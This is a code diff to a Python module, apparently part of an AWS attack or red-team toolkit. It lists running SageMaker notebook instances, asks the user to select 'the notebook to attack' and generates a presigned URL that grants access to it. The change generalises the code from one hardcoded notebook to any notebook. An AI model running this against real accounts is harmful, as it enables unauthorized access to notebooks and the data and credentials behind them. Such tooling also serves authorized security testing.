@@ -1,7 +1,8 @@
 import boto3
 from colorama import Fore, Style
 
-def create_client(botoconfig, session, region):
+def create_client(botoconfig, session):
+    region = input("Please specify a region to check for notebooks: ")
     client = session.client('sagemaker', config=botoconfig, region_name=region)
     return client
 
@@ -35,29 +36,34 @@ def check_permissions(selected_session):
     else:
         return False 
 
-def check_existing_notebooks(botoconfig, session):
-    region = input("Please specify a region to create the notebook: ")
-    sagemaker_client = create_client(botoconfig, session, region)
+def check_existing_notebooks(botoconfig, session, sagemaker_client):
     status = sagemaker_client.list_notebook_instances(
         SortBy='Name',
-        NameContains='MLConfig',
         StatusEquals='InService'
     )
 
     if status['NotebookInstances'] == []:
         return False
     else:
-        for notebook in status['NotebookInstances']:
-            print(notebook)
-        return status, sagemaker_client
+        return status
 
 def select_notebook(notebook_list):
-    print("We need to create a menu for the user to select a notebook to create a presigned URL")
+    print("[+] Please select the notebook to attack...")
+    notebook_arns = {}
+    option = 1
+    for notebook in notebook_list['NotebookInstances']:
+        print("\t{}: ".format(str(option))+Fore.GREEN+"{}".format(notebook['NotebookInstanceName'])+Style.RESET_ALL)
+        notebook_arns[str(option)] = notebook['NotebookInstanceName']
+        option += 1
+    
+    selected_option = input("\nSelected Notebook: ")
 
-def create_presigned_url(sagemaker_client):
+    return notebook_arns[selected_option]
+
+def create_presigned_url(sagemaker_client, selected_notebook):
     try:
         signed_url = sagemaker_client.create_presigned_notebook_instance_url(
-            NotebookInstanceName='MLConfig'
+            NotebookInstanceName=selected_notebook
         )
 
         return signed_url
@@ -82,8 +88,9 @@ def main(botoconfig, session, selected_session):
                 return 
 
         print("[+] Checking for existing notebooks...")
-        existing_notebooks, sagemaker_client = check_existing_notebooks(botoconfig, session)
-        if existing_notebooks == []:
+        sagemaker_client = create_client(botoconfig, session)
+        existing_notebooks = check_existing_notebooks(botoconfig, session, sagemaker_client)
+        if not existing_notebooks:
             print("[-] There is "+Fore.RED+"no existing notebooks..."+Style.RESET_ALL+"This module requires an existing notebook to run..."+Style.RESET_ALL)
             return False
 
@@ -91,7 +98,7 @@ def main(botoconfig, session, selected_session):
         selected_notebook = select_notebook(existing_notebooks)
         
         print("[+] Creating pre-signed URL...")
-        signed_url = create_presigned_url(sagemaker_client)
+        signed_url = create_presigned_url(sagemaker_client, selected_notebook)
         print("[+] Signed Url: "+Fore.GREEN+"{}".format(signed_url['AuthorizedUrl'])+Style.RESET_ALL)
 
     except Exception as e:
